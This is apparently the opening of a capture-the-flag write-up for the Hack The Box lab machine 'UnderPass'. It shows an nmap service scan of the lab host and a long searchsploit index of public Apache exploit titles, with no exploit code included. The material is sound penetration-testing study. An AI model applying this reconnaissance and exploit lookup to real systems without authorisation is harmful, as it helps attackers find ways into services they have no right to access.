# UnderPass
OS: Linux\
Difficulty: Easy

## Steps
### Recon
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
└──╼ [★]$ nmap -Pn -T5 --min-rate=1000 --open -sV underpass.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 18:18 CST
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.067s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/018e938a-87b9-44db-a2c6-b9738578513c) returned 404 during the image audit (2026-10-08).


We can see that Apache is running.

### Exploit-Search
There is default apache running, so I will need to see if that version has any specific exploits.
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
└──╼ [★]$ searchsploit apache
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache (Windows x86) - Chunked Encoding (Metasploit)                                                                                | windows_x86/remote/16782.rb
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                     | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                   | php/remote/29316.py
Apache - Arbitrary Long HTTP Headers (Denial of Service)                                                                            | multiple/dos/360.pl
Apache - Arbitrary Long HTTP Headers Denial of Service                                                                              | linux/dos/371.c
Apache - Denial of Service                                                                                                          | linux/dos/18221.c
Apache - httpOnly Cookie Disclosure                                                                                                 | multiple/remote/18442.html
Apache - Remote Memory Exhaustion (Denial of Service)                                                                               | multiple/dos/17696.pl
Apache 0.8.x/1.0.x / NCSA HTTPd 1.x - 'test-cgi' Directory Listing                                                                  | cgi/remote/20435.txt
Apache 1.0/1.2/1.3 - Server Address Disclosure                                                                                      | multiple/remote/21067.c
Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape Server 1.12/1.1/2.0 - a nph-test-cgi                                                       | multiple/dos/19536.txt
Apache 1.2 - Denial of Service                                                                                                      | multiple/dos/20558.txt
Apache 1.2.5/1.3.1 / UnityMail 2.0 - MIME Header Denial of Service                                                                  | windows/dos/20272.pl
Apache 1.3 + PHP 3 - File Disclosure                                                                                                | multiple/remote/20466.txt
Apache 1.3 - Artificially Long Slash Path Directory Listing (1)                                                                     | multiple/remote/20692.pl
Apache 1.3 - Artificially Long Slash Path Directory Listing (2)                                                                     | multiple/remote/20693.c
Apache 1.3 - Artificially Long Slash Path Directory Listing (3)                                                                     | multiple/remote/20694.pl
Apache 1.3 - Artificially Long Slash Path Directory Listing (4)                                                                     | multiple/remote/20695.pl
Apache 1.3 - Directory Index Disclosure                                                                                             | multiple/remote/21002.txt
Apache 1.3.12 - WebDAV Directory Listings                                                                                           | linux/remote/20210.txt
Apache 1.3.14 - Mac File Protection Bypass                                                                                          | osx/remote/20911.txt
Apache 1.3.20 (Win32) - 'PHP.exe' Remote File Disclosure                                                                            | windows/remote/21204.txt
Apache 1.3.31 mod_include - Local Buffer Overflow                                                                                   | linux/local/587.c
Apache 1.3.34/1.3.33 (Ubuntu / Debian) - CGI TTY Privilege Escalation                                                               | linux/local/3384.c
Apache 1.3.35/2.0.58/2.2.2 - Arbitrary HTTP Request Headers Security                                                                | linux/remote/28424.txt
Apache 1.3.6/1.3.9/1.3.11/1.3.12/1.3.20 - Root Directory Access                                                                     | windows/remote/19975.pl
Apache 1.3.x + Tomcat 4.0.x/4.1.x mod_jk - Chunked Encoding Denial of Service                                                       | unix/dos/22068.pl
Apache 1.3.x - HTDigest Realm Command Line Argument Buffer Overflow (1)                                                             | unix/remote/25624.c
Apache 1.3.x - HTDigest Realm Command Line Argument Buffer Overflow (2)                                                             | unix/remote/25625.c
Apache 1.3.x < 2.0.48 mod_userdir - Remote Users Disclosure                                                                         | linux/remote/132.c
Apache 1.3.x mod_include - Local Buffer Overflow                                                                                    | linux/local/24694.c
Apache 1.3.x mod_mylo - Remote Code Execution                                                                                       | multiple/remote/67.c
Apache 1.3/2.0.x - Server Side Include Cross-Site Scripting                                                                         | multiple/remote/21885.txt
Apache 1.4/2.2.x - APR 'apr_fnmatch()' Denial of Service                                                                            | linux/dos/35738.php
Apache 1.x/2.0.x - Chunked-Encoding Memory Corruption (1)                                                                           | multiple/remote/21559.c
Apache 1.x/2.0.x - Chunked-Encoding Memory Corruption (2)                                                                           | multiple/remote/21560.c
Apache 2.0 - Encoded Backslash Directory Traversal                                                                                  | windows/remote/21697.txt
Apache 2.0 - Full Path Disclosure                                                                                                   | windows/remote/21719.txt
Apache 2.0 mod_jk2 2.0.2 (Windows x86) - Remote Buffer Overflow                                                                     | windows_x86/remote/5330.c
Apache 2.0.39/40 - Oversized STDERR Buffer Denial of Service                                                                        | linux/dos/21854.c
Apache 2.0.44 (Linux) - Remote Denial of Service                                                                                    | linux/dos/11.c
Apache 2.0.45 - 'APR' Crash                                                                                                         | linux/dos/38.pl
Apache 2.0.49 - Arbitrary Long HTTP Headers Denial of Service                                                                       | multiple/dos/1056.pl
Apache 2.0.4x mod_perl - File Descriptor Leakage (3)                                                                                | linux/local/23581.pl
Apache 2.0.4x mod_php - File Descriptor Leakage (1)                                                                                 | linux/local/23481.c
Apache 2.0.4x mod_php - File Descriptor Leakage (2)                                                                                 | linux/local/23482.c
Apache 2.0.52 - GET Denial of Service                                                                                               | multiple/dos/855.pl
Apache 2.0.58 mod_rewrite (Windows 2003) - Remote Overflow                                                                          | windows/remote/3996.c
Apache 2.2 (Windows) - Local Denial of Service                                                                                      | windows/dos/15319.pl
Apache 2.2 - Scoreboard Invalid Free On Shutdown                                                                                    | linux/dos/41768.txt
Apache 2.2.14 mod_isapi - Dangling Pointer Remote SYSTEM                                                                            | windows/remote/11650.c
Apache 2.2.15 mod_proxy - Reverse Proxy Security Bypass                                                                             | linux/remote/36663.txt
Apache 2.2.2 - CGI Script Source Code Information Disclosure                                                                        | multiple/remote/28365.txt
Apache 2.2.4 - 413 Error HTTP Request Method Cross-Site Scripting                                                                   | unix/remote/30835.sh
Apache 2.2.6 (Windows) - Share PHP File Extension Mapping Information Disclosure                                                    | windows/remote/30901.txt
Apache 2.2.6 mod_negotiation - HTML Injection / HTTP Response Splitting                                                             | linux/remote/31052.java
Apache 2.4.17 - Denial of Service                                                                                                   | windows/dos/39037.php
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                               | linux/local/46676.php
Apache 2.4.23 mod_http2 - Denial of Service                                                                                         | linux/dos/40909.py
Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution                                                     | php/remote/40142.php
Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                        | linux/dos/34133.txt
Apache 2.4.x - Buffer Overflow                                                                                                      | multiple/webapps/51193.py
Apache 2.x - Memory Leak                                                                                                            | windows/dos/9.c
Apache 7.0.x mod_proxy - Reverse Proxy Security Bypass                                                                              | linux/remote/36352.txt
Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow                                                                          | multiple/remote/2237.sh
Apache < 2.0.64 / < 2.2.21 mod_setenvif - Integer Overflow                                                                          | linux/dos/41769.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                    | linux/webapps/42745.py
Apache ActiveMQ 5.11.1/5.13.2 - Directory Traversal / Command Execution                                                             | windows/remote/40857.txt
Apache ActiveMQ 5.2/5.3 - Source Code Information Disclosure                                                                        | multiple/remote/33868.txt
Apache ActiveMQ 5.3 - 'admin/queueBrowse' Cross-Site Scripting                                                                      | multiple/remote/33905.txt
Apache ActiveMQ 5.x-5.11.1 - Directory Traversal Shell Upload (Metasploit)                                                          | windows/remote/48181.rb
Apache Airflow 1.10.10 - 'Example Dag' Remote Code Execution                                                                        | multiple/webapps/49927.py
Apache APISIX 2.12.1 - Remote Code Execution (RCE)                                                                                  | multiple/remote/50829.py
Apache APR - Hash Collision Denial of Service                                                                                       | linux/dos/36669.txt
Apache Archiva 1.0 < 1.3.1 - Cross-Site Request Forgery                                                                             | multiple/webapps/15710.txt
Apache Archiva 1.3.9 - Multiple Cross-Site Request Forgery Vulnerabilities                                                          | xml/webapps/40109.txt
Apache AXIS 1.0 - Non-Existent WSDL Path Information Disclosure                                                                     | multiple/remote/29930.txt
Apache Axis 1.4 - Remote Code Execution                                                                                             | multiple/remote/46682.py
Apache Axis2 1.4.1 - Local File Inclusion                                                                                           | php/webapps/12721.txt
Apache Axis2 1.x - '/axis2/axis2-admin' Session Fixation                                                                            | multiple/remote/34186.txt
Apache Axis2 Administration Console - (Authenticated) Cross-Site Scripting                                                          | multiple/webapps/12689.txt
Apache cocoon 2.14/2.2 - Directory Traversal                                                                                        | multiple/remote/23282.txt
Apache Commons FileUpload and Apache Tomcat - Denial of Service                                                                     | multiple/dos/31615.rb
Apache Continuum - Arbitrary Command Execution (Metasploit)                                                                         | linux/remote/39945.rb
Apache Continuum 1.4.2 - Multiple Vulnerabilities                                                                                   | java/webapps/39886.txt
Apache CouchDB - Arbitrary Command Execution (Metasploit)                                                                           | linux/remote/45019.rb
Apache CouchDB 1.5.0 - 'uuids' Denial of Service                                                                                    | multiple/dos/32519.txt
Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Escalation                                                                    | linux/webapps/44498.py
Apache CouchDB 2.0.0 - Local Privilege Escalation                                                                                   | windows/local/40865.txt
Apache CouchDB 2.3.0 - Cross-Site Scripting                                                                                         | multiple/webapps/46406.txt
Apache CouchDB 2.3.1 - Cross-Site Request Forgery / Cross-Site Scripting                                                            | multiple/webapps/46595.txt
Apache CouchDB 3.2.1 - Remote Code Execution (RCE)                                                                                  | linux/remote/50914.py
Apache CouchDB < 2.1.0 - Remote Code Execution                                                                                      | linux/webapps/44913.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                 | multiple/dos/26710.txt
Apache Cygwin 1.3.x/2.0.x - Directory Traversal                                                                                     | windows/remote/23751.txt
Apache Flink 1.11.0 - Unauthenticated Arbitrary File Read (Metasploit)                                                              | java/webapps/49398.rb
Apache Flink 1.9.x - File Upload RCE (Unauthenticated)                                                                              | java/webapps/48978.py
Apache Geronimo 1.0 - Error Page Cross-Site Scripting                                                                               | multiple/remote/27096.txt
Apache Geronimo 2.1.3 - Multiple Directory Traversal Vulnerabilities                                                                | multiple/remote/8458.txt
Apache Geronimo 2.1.x - '/console/portal/' URI Cross-Site Scripting                                                                 | multiple/remote/32921.txt
Apache Geronimo 2.1.x - '/console/portal/Server/Monitoring' Multiple Cross-Site Scripting Vulnerabilities                           | multiple/remote/32920.txt
Apache Geronimo 2.1.x - Cross-Site Request Forgery (Multiple Admin Function)                                                        | multiple/remote/32922.html
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                                                            | multiple/webapps/50383.sh
Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)                                                            | multiple/webapps/50406.sh
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)                                                                         | multiple/webapps/50446.sh
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)                                                                         | multiple/webapps/50512.py
Apache Httpd mod_proxy - Error Page Cross-Site Scripting                                                                            | multiple/webapps/47688.md
Apache Httpd mod_rewrite - Open Redirects                                                                                           | multiple/webapps/47689.md
Apache JackRabbit - WebDAV XML External Entity                                                                                      | java/webapps/37110.py
Apache JackRabbit 1.4/1.5 Content Repository (JCR) - 'search.jsp?q' Cross-Site Scripting                                            | jsp/webapps/32741.txt
Apache JackRabbit 1.4/1.5 Content Repository (JCR) - 'swr.jsp?q' Cross-Site Scripting                                               | jsp/webapps/32742.txt
Apache JackRabbit 2.0.0 - webapp XPath Injection                                                                                    | jsp/webapps/14617.txt
Apache James Server 2.2 - SMTP Denial of Service                                                                                    | multiple/dos/27915.pl
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                                                | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                                                | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                                      | linux/remote/50347.py
Apache Jetspeed - Arbitrary File Upload (Metasploit)                                                                                | java/remote/39643.rb
Apache Libcloud Digital Ocean API - Local Information Disclosure                                                                    | linux/local/38937.txt
Apache Log4j 2 - Remote Code Execution (RCE)                                                                                        | java/remote/50592.py
Apache Log4j2 2.14.1 - Information Disclosure                                                                                       | java/remote/50590.py
Apache Mina 2.0.13 - Remote Command Execution                                                                                       | multiple/remote/40382.txt
Apache Mod_Access_Referer 1.0.2 - Null Pointer Dereference Denial of Service                                                        | multiple/dos/22505.txt
Apache Mod_Auth_OpenID - Session Stealing                                                                                           | linux/local/18917.txt
Apache mod_cgi - 'Shellshock' Remote Command Injection                                                                              | linux/remote/34900.py
Apache mod_dav / svn - Remote Denial of Service                                                                                     | multiple/dos/8842.pl
Apache mod_gzip (with debug_mode) 1.2.26.1a - Remote Overflow                                                                       | linux/remote/126.c
Apache mod_jk 1.2.19 (Windows x86) - Remote Buffer Overflow                                                                         | windows_x86/remote/6100.py
Apache mod_jk 1.2.19/1.2.20 - Remote Buffer Overflow                                                                                | multiple/remote/4093.pl
Apache mod_perl - 'Apache::Status' / 'Apache2::Status' Cross-Site Scripting                                                         | multiple/remote/9993.txt
Apache mod_proxy - Reverse Proxy Exposure                                                                                           | multiple/remote/17969.py
Apache mod_rewrite (Windows x86) - Off-by-One Remote Overflow                                                                       | windows_x86/remote/3680.sh
Apache mod_rewrite - LDAP protocol Buffer Overflow (Metasploit)                                                                     | windows/remote/16752.rb
Apache mod_session_crypto - Padding Oracle                                                                                          | multiple/webapps/40961.py
Apache mod_ssl 2.0.x - Remote Denial of Service                                                                                     | linux/dos/24590.txt
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                                          | multiple/dos/21575.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                          | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                          | unix/remote/47080.c
Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                                        | unix/remote/40347.txt
Apache mod_wsgi - Information Disclosure                                                                                            | linux/remote/39196.py
Apache MyFaces - 'ln' Information Disclosure                                                                                        | multiple/remote/36681.txt
Apache MyFaces Tomahawk JSF Framework 1.1.5 - 'Autoscroll' Cross-Site Scripting                                                     | jsp/webapps/30191.txt
Apache OFBiz - Admin Creator                                                                                                        | multiple/remote/12264.txt
Apache OFBiz - Multiple Cross-Site Scripting Vulnerabilities                                                                        | php/webapps/12330.txt
Apache OFBiz - Remote Execution (via SQL Execution)                                                                                 | multiple/remote/12263.txt
Apache OFBiz 10.4.x - Multiple Cross-Site Scripting Vulnerabilities                                                                 | multiple/remote/38230.txt
Apache OFBiz 16.11.04 - XML External Entity Injection                                                                               | java/webapps/45673.py
Apache OFBiz 16.11.05 - Cross-Site Scripting                                                                                        | multiple/webapps/45975.txt
Apache OFBiz 17.12.03 - Cross-Site Request Forgery (Account Takeover)                                                               | java/webapps/48408.txt
Apache Olingo OData 4.0 - XML External Entity Injection                                                                             | java/webapps/47770.txt
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                 | linux/webapps/39642.txt
Apache OpenMeetings 5.0.0 - 'hostname' Denial of Service                                                                            | multiple/webapps/49094.txt
Apache Pluto 3.0.0 / 3.0.1 - Persistent Cross-Site Scripting                                                                        | java/webapps/46759.txt
Apache Portals Pluto 3.0.0 - Remote Code Execution                                                                                  | windows/webapps/45396.txt
Apache Rave 0.11 < 0.20 - User Information Disclosure                                                                               | multiple/webapps/24744.txt
Apache Roller - OGNL Injection (Metasploit)                                                                                         | java/remote/29859.rb
Apache Roller 5.0.3 - XML External Entity Injection (File Disclosure)                                                               | linux/webapps/45341.py
Apache Shindig - XML External Entity Information Disclosure                                                                         | multiple/remote/38813.txt
Apache Shiro - Directory Traversal                                                                                                  | multiple/remote/34952.txt
Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE (Metasploit)                                                                    | multiple/remote/48410.rb
Apache Sling - Denial of Service                                                                                                    | multiple/dos/37487.txt
Apache Sling Framework (Adobe AEM) 2.3.6 - Information Disclosure                                                                   | multiple/webapps/39435.txt
Apache Solr - Remote Code Execution via Velocity Template (Metasploit)                                                              | multiple/remote/48338.rb
Apache Solr 7.0.1 - XML External Entity Expansion / Remote Code Execution                                                           | xml/webapps/43009.txt
Apache Solr 8.2.0 - Remote Code Execution                                                                                           | java/webapps/47572.py
Apache SpamAssassin Milter Plugin 0.3.1 - Remote Command Execution                                                                  | multiple/remote/11662.txt
Apache Spark - (Unauthenticated) Command Execution (Metasploit)                                                                     | java/remote/45925.rb
Apache Spark Cluster 1.3.x - Arbitrary Code Execution                                                                               | linux/remote/36562.txt
Apache Struts - 'ParametersInterceptor' Remote Code Execution (Metasploit)                                                          | multiple/remote/24874.rb
Apache Struts - ClassLoader Manipulation Remote Code Execution (Metasploit)                                                         | multiple/remote/33142.rb
Apache Struts - Developer Mode OGNL Execution (Metasploit)                                                                          | java/remote/31434.rb
Apache Struts - Dynamic Method Invocation Remote Code Execution (Metasploit)                                                        | linux/remote/39756.rb
Apache Struts - includeParams Remote Code Execution (Metasploit)                                                                    | multiple/remote/25980.rb
Apache Struts - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                            | multiple/webapps/18452.txt
Apache Struts - OGNL Expression Injection                                                                                           | multiple/remote/38549.txt
Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution                                                    | multiple/remote/43382.py
Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution (Metasploit)                                       | multiple/remote/39919.rb
Apache Struts 1.2.7 - Error Response Cross-Site Scripting                                                                           | multiple/remote/26542.txt
Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution                                                                  | java/webapps/48917.py
Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                                                     | multiple/remote/27135.rb
Apache Struts 2 - Namespace Redirect OGNL Injection (Metasploit)                                                                    | multiple/remote/45367.rb
Apache Struts 2 - Skill Name Remote Code Execution                                                                                  | multiple/remote/37647.txt
Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasploit)                                                         | multiple/remote/44643.rb
Apache Struts 2 < 2.3.1 - Multiple Vulnerabilities                                                                                  | multiple/webapps/18329.txt
Apache Struts 2.0 - 'XSLTResult.java' Arbitrary File Upload                                                                         | java/webapps/37009.xml
Apache Struts 2.0.0 < 2.2.1.1 - XWork 's:submit' HTML Tag Cross-Site Scripting                                                      | multiple/remote/35735.txt
Apache Struts 2.0.1 < 2.3.33 / 2.5 < 2.5.10 - Arbitrary Code Execution                                                              | multiple/remote/44556.py
Apache Struts 2.0.9/2.1.8 - Session Tampering Security Bypass                                                                       | multiple/remote/36426.txt
Apache Struts 2.2.1.1 - Remote Command Execution (Metasploit)                                                                       | multiple/remote/18984.rb
Apache Struts 2.2.3 - Multiple Open Redirections                                                                                    | multiple/remote/38666.txt
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (1)                                                               | linux/remote/45260.py
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (2)                                                               | multiple/remote/45262.py
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - 'Jakarta' Multipart Parser OGNL Injection (Metasploit)                                | multiple/remote/41614.rb
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution                                                                 | linux/webapps/41570.py
Apache Struts 2.3.x Showcase - Remote Code Execution                                                                                | multiple/webapps/42324.py
Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution                                                              | linux/remote/42627.py
Apache Struts 2.5.20 - Double OGNL evaluation                                                                                       | multiple/remote/49068.py
Apache Struts < 1.3.10 / < 2.3.16.2 - ClassLoader Manipulation Remote Code Execution (Metasploit)                                   | multiple/remote/41690.rb
Apache Struts < 2.2.0 - Remote Command Execution (Metasploit)                                                                       | multiple/remote/17691.rb
Apache Struts2 2.0.0 < 2.3.15 - Prefixed Parameters OGNL Injection                                                                  | multiple/webapps/44583.txt
Apache Subversion - Remote Denial of Service                                                                                        | linux/dos/38422.txt
Apache Subversion 1.6.x - 'mod_dav_svn/lock.c' Remote Denial of Service                                                             | linux/dos/38421.txt
Apache suEXEC - Information Disclosure / Privilege Escalation                                                                       | linux/remote/27397.txt
Apache Superset 1.1.0 - Time-Based Account Enumeration                                                                              | multiple/webapps/50072.py
Apache Superset 2.0.0 - Authentication Bypass                                                                                       | multiple/webapps/51447.py
Apache Superset < 0.23 - Remote Code Execution                                                                                      | linux/webapps/45933.py
Apache Syncope 2.0.7 - Remote Code Execution                                                                                        | windows/webapps/45400.txt
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                                                                     | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection                                                                                       | windows/remote/46540.py
Apache Tomcat (Windows) - 'runtime.getRuntime().exec()' Local Privilege Escalation                                                  | windows/local/7264.txt
Apache Tomcat - 'WebDAV' Remote File Disclosure                                                                                     | multiple/remote/4530.pl
Apache Tomcat - Account Scanner / 'PUT' Request Command Execution                                                                   | multiple/remote/18619.txt
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                                                                   | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                                                                     | multiple/webapps/49039.rb
Apache Tomcat - CGIServlet enableCmdLineArguments Remote Code Execution (Metasploit)                                                | windows/remote/47073.rb
Apache Tomcat - Cookie Quote Handling Remote Information Disclosure                                                                 | multiple/remote/9994.txt
Apache Tomcat - Form Authentication 'Username' Enumeration                                                                          | multiple/remote/9995.txt
Apache Tomcat - WebDAV SSL Remote File Disclosure                                                                                   | linux/remote/4552.pl
Apache Tomcat / Geronimo 1.0 - 'Sample Script cal2.jsp?time' Cross-Site Scripting                                                   | multiple/remote/27095.txt
Apache Tomcat 10.1 - Denial Of Service                                                                                              | multiple/dos/51262.py
Apache Tomcat 3.0 - Directory Traversal                                                                                             | windows/remote/20716.txt
Apache Tomcat 3.1 - Path Revealing                                                                                                  | multiple/remote/20131.txt
Apache Tomcat 3.2 - 404 Error Page Cross-Site Scripting                                                                             | multiple/remote/33379.txt
Apache Tomcat 3.2 - Directory Disclosure                                                                                            | unix/remote/21882.txt
Apache Tomcat 3.2.1 - 404 Error Page Cross-Site Scripting                                                                           | multiple/webapps/10292.txt
Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' Information Disclosuree                                                                  | multiple/remote/21492.txt
Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' Information Disclosure                                                                     | multiple/remote/21490.txt
Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Disclosure                                                             | multiple/remote/21491.txt
Apache Tomcat 3.x - Null Byte Directory / File Disclosure                                                                           | linux/remote/22205.txt
Apache Tomcat 3/4 - 'DefaultServlet' File Disclosure                                                                                | unix/remote/21853.txt
Apache Tomcat 3/4 - JSP Engine Denial of Service                                                                                    | linux/dos/21534.jsp
Apache Tomcat 4.0.3 - Denial of Service 'Device Name' / Cross-Site Scripting                                                        | windows/webapps/21605.txt
Apache Tomcat 4.0.3 - Requests Containing MS-DOS Device Names Information Disclosure                                                | multiple/remote/31551.txt
Apache Tomcat 4.0.3 - Servlet Mapping Cross-Site Scripting                                                                          | linux/remote/21604.txt
Apache Tomcat 4.0.x - Non-HTTP Request Denial of Service                                                                            | linux/dos/23245.pl
Apache Tomcat 4.0/4.1 - Servlet Full Path Disclosure                                                                                | unix/remote/21412.txt
Apache Tomcat 4.1 - JSP Request Cross-Site Scripting                                                                                | unix/remote/21734.txt
Apache Tomcat 5 - Information Disclosure                                                                                            | multiple/remote/28254.txt
Apache Tomcat 5.5.0 < 5.5.29 / 6.0.0 < 6.0.26 - Information Disclosure                                                              | multiple/remote/12343.txt
Apache Tomcat 5.5.15 - cal2.jsp Cross-Site Scripting                                                                                | jsp/webapps/30563.txt
Apache Tomcat 5.5.25 - Cross-Site Request Forgery                                                                                   | multiple/webapps/29435.txt
Apache Tomcat 5.x/6.0.x - Directory Traversal                                                                                       | linux/remote/29739.txt
Apache Tomcat 6.0.10 - Documentation Sample Application Multiple Cross-Site Scripting Vulnerabilities                               | multiple/remote/30052.txt
Apache Tomcat 6.0.13 - Host Manager Servlet Cross-Site Scripting                                                                    | multiple/remote/30495.html
Apache Tomcat 6.0.13 - Insecure Cookie Handling Quote Delimiter Session ID Disclosure                                               | multiple/remote/30496.txt
Apache Tomcat 6.0.13 - JSP Example Web Applications Cross-Site Scripting                                                            | jsp/webapps/30189.txt
Apache Tomcat 6.0.15 - Cookie Quote Handling Remote Information Disclosure                                                          | multiple/remote/31130.txt
Apache Tomcat 6.0.16 - 'HttpServletResponse.sendError()' Cross-Site Scripting                                                       | multiple/remote/32138.txt
Apache Tomcat 6.0.16 - 'RequestDispatcher' Information Disclosure                                                                   | multiple/remote/32137.txt
Apache Tomcat 6.0.18 - Form Authentication Existing/Non-Existing 'Username' Enumeration                                             | multiple/remote/33023.txt
Apache Tomcat 6/7/8/9 - Information Disclosure                                                                                      | multiple/remote/41783.txt
Apache Tomcat 7.0.4 - 'sort' / 'orderBy' Cross-Site Scripting                                                                       | linux/remote/35011.txt
Apache Tomcat 8/7/6 (Debian-Based Distros) - Local Privilege Escalation                                                             | linux/local/40450.txt
Apache Tomcat 8/7/6 (RedHat Based Distros) - Local Privilege Escalation                                                             | linux/local/40488.txt
Apache Tomcat 9.0.0.M1 - Cross-Site Scripting (XSS)                                                                                 | multiple/webapps/50119.txt
Apache Tomcat 9.0.0.M1 - Open Redirect                                                                                              | multiple/webapps/50118.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                   | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                 | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                           | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                        | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                        | jsp/webapps/42966.py
Apache Tomcat Connector jk2-2.0.2 mod_jk2 - Remote Overflow                                                                         | linux/remote/5386.txt
Apache Tomcat Connector mod_jk - 'exec-shield' Remote Overflow                                                                      | linux/remote/4162.c
Apache Tomcat Manager - Application Deployer (Authenticated) Code Execution (Metasploit)                                            | multiple/remote/16317.rb
Apache Tomcat Manager - Application Upload (Authenticated) Code Execution (Metasploit)                                              | multiple/remote/31433.rb
Apache Tomcat mod_jk 1.2.20 - Remote Buffer Overflow (Metasploit)                                                                   | windows/remote/16798.rb
Apache Tomcat/JBoss EJBInvokerServlet / JMXInvokerServlet (RMI over HTTP) Marshalled Object - Remote Code Execution                 | php/remote/28713.php
Apache UNO / LibreOffice Version: 6.1.2 / OpenOffice 4.1.6 API - Remote Code Execution                                              | multiple/remote/46544.py
Apache Web Server 2.0.x - MS-DOS Device Name Denial of Service                                                                      | linux/dos/22191.pl
Apache Win32 1.3.x/2.0.x - Batch File Remote Command Execution                                                                      | windows/remote/21350.pl
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                        | linux/dos/36906.txt
Apache2Triad 1.5.4 - Multiple Vulnerabilities                                                                                       | php/webapps/42520.txt
Apache::Gallery 0.4/0.5/0.6 - Insecure File Storage Privilege Escalation                                                            | linux/local/23119.c
ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)                                                                               | java/webapps/50178.sh
AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution                                                          | cgi/webapps/35035.txt
Azure Apache Ambari 2302250400 - Spoofing                                                                                           | multiple/remote/51546.py
Bea Weblogic Apache Connector - Code Execution / Denial of Service                                                                  | windows/remote/6089.pl
Cobalt RaQ 2.0/3.0 - Apache .htaccess Disclosure                                                                                    | multiple/remote/19828.txt
htpasswd Apache 1.3.31 - Local Overflow                                                                                             | linux/local/466.pl
Joomla! Component com_intuit - Apache Directory listing Download                                                                    | php/webapps/10811.txt
NCSA 1.3/1.4.x/1.5 / Apache HTTPd 0.8.11/0.8.14 - ScriptAlias Source Retrieval                                                      | multiple/remote/20595.txt
Oracle Java JDK/JRE < 1.8.0.131 / Apache Xerces 2.11.0 - 'PDF/Docx' Server Side Denial of Service                                   | php/dos/44057.md
Oracle Weblogic Apache Connector - POST Buffer Overflow (Metasploit)                                                                | windows/remote/18897.rb
PHP 5.4.3 - apache_request_headers Function Buffer Overflow (Metasploit)                                                            | windows/remote/19231.rb
